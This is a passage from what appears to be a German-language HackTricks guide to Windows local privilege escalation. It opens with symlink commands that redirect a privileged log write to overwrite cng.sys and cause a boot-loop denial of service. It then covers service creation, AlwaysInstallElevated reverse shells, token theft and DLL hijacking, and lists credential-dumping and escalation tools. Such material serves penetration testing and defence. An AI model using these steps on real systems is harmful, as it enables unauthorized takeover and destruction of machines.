CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente das Log schreibt (z. B. indem ein Admin „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **Bootloop-DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Existiert jedoch eine Kopie unter `C:\Windows\System32\cng.sys`, wird möglicherweise zuerst diese geladen, wodurch sie zu einem zuverlässigen DoS-Ziel für beschädigte Daten wird.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits in einem High-Integrity-Prozess ausführst, kann der **Weg zu SYSTEM** ganz einfach sein: **Erstelle einen neuen Dienst und führe ihn aus**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Wenn du eine Service-Binärdatei erstellst, stelle sicher, dass sie ein gültiger Service ist oder die erforderlichen Aktionen schnell genug ausführt, da sie nach 20 Sekunden beendet wird, wenn sie kein gültiger Service ist.

### AlwaysInstallElevated

Von einem Prozess mit hoher Integrität aus könntest du versuchen, **die AlwaysInstallElevated-Registry-Einträge zu aktivieren** und eine Reverse Shell mithilfe eines _**.msi**_-Wrappers zu **installieren**.\
[Weitere Informationen zu den betroffenen Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### Hohe Integrität + SeImpersonate-Berechtigung zu System

**Den** [**Code findest du hier**](seimpersonate-from-high-to-system.md)**.**

### Von SeDebug + SeImpersonate zu vollständigen Token-Berechtigungen

Wenn du über diese Token-Berechtigungen verfügst (wahrscheinlich findest du sie in einem Prozess mit hoher Integrität), kannst du mit der SeDebug-Berechtigung **fast jeden Prozess öffnen** (ausgenommen geschützte Prozesse), das **Token** des Prozesses **kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei dieser Technik wird üblicherweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Berechtigungen ausgeführt wird** (_ja, es gibt SYSTEM-Prozesse ohne alle Token-Berechtigungen_).\
**Ein** [**Codebeispiel, das die vorgeschlagene Technik ausführt, findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter verwendet, um mit `getsystem` Rechte zu erweitern. Dabei wird **eine Pipe erstellt und anschließend ein Service erstellt bzw. missbraucht, um in diese Pipe zu schreiben**. Danach kann der **Server**, der die Pipe mithilfe der **`SeImpersonate`**-Berechtigung erstellt hat, **das Token** des Pipe-Clients (des Services) **imitieren** und so SYSTEM-Berechtigungen erlangen.\
Wenn du [**mehr über Named Pipes erfahren möchtest, solltest du dies lesen**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel dafür lesen möchtest, [**wie du mithilfe von Named Pipes von hoher Integrität zu System gelangst, solltest du dies lesen**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine DLL zu **kapern**, die von einem **Prozess** mit **SYSTEM**-Berechtigungen **geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Daher ist Dll Hijacking auch für diese Art der Rechteausweitung nützlich. Außerdem ist es **von einem Prozess mit hoher Integrität deutlich einfacher zu erreichen**, da dieser **Schreibberechtigungen** für die Ordner hat, aus denen DLLs geladen werden.\
**Mehr über Dll Hijacking kannst du** [**hier erfahren**](dll-hijacking/index.html)**.**

### **Von Administrator oder Network Service zu System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Von LOCAL SERVICE oder NETWORK SERVICE zu vollständigen Berechtigungen

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische Impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool zum Suchen nach lokalen Windows-Rechteausweitungsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und sensiblen Dateien (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wird erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen aus PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal mit -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Zugangsdaten aus dem Credential Manager. Wird erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprüht gesammelte Passwörter über die Domäne**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-ADIDNS/LLMNR/mDNS-Spoofing- und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Einfache Windows-Aufzählung für Rechteausweitung**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Schwachstellen für Rechteausweitung (VERALTET; Watson verwenden)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Prüfungen **(Admin-Rechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Schwachstellen für Rechteausweitung (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als für Rechteausweitung) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Zugangsdaten aus vielen Programmen (vorkompilierte exe auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp auf C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sucht nach Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sucht nach möglichen Fehlkonfigurationen (exe aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf Grundlage dieses Beitrags erstellt wurde (accesschk ist für die ordnungsgemäße Funktion nicht erforderlich, kann aber verwendet werden).

**Lokal**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der passenden .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Zielhost installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grundlagen der Windows-Privilege-Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Privilege Escalation durch Ausnutzen schwacher Ordnerberechtigungen](http://www.greyhathacker.net/?p=738)
- [3] [Windows-Privilege-Escalation – ein Cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Workshop zu lokaler Privilege Escalation unter Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation – Windows – OSCP-Gesamtleitfaden](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Privilege Escalation – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Leitfaden zur Windows-Privilege-Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation-Checkliste](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows-Privilege-Escalation-Methoden für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → hMailServer-Anmeldedaten entschlüsseln → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-Leak + Stack-BOF → VirtualAlloc ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf den Silver Fox: Katz-und-Maus-Spiel in den Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Schwachstelle im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ein Link in die Vergangenheit: Symbolische Links unter Windows missbrauchen](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt-Strike-BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – C/C++-Checklistenaufgaben, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – RtlQueryRegistryValues-Funktion](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Dienst-Binärdateien kapern](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: CLDFLT und DirectX-Kernel-Race-Conditions für Windows-LPE verketten](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie alle zu beherrschen: Eine vollständige Read/Write-Exploit-Primitive unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Beliebige Dateilöschungen missbrauchen, um Privilegien zu erhöhen, und weitere nützliche Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – FilesystemEoPs-Exploit-Code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe, Teil 2: CVE-2020-1013, eine Local-Privilege-Escalation-Schwachstelle (1-Day) in Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource-Based Constrained Delegation: Wenn eine Imageänderung zur Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – SSH-Privatschlüssel aus dem SSH-Agent von Windows 10 extrahieren](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – Privilege Escalation durch Löschen des Microsoft-Windows-Installer-Ordners](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec – Total Recall: Die eigenen Schritte zurück zu NT AUTHORITY\SYSTEM nachverfolgen](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
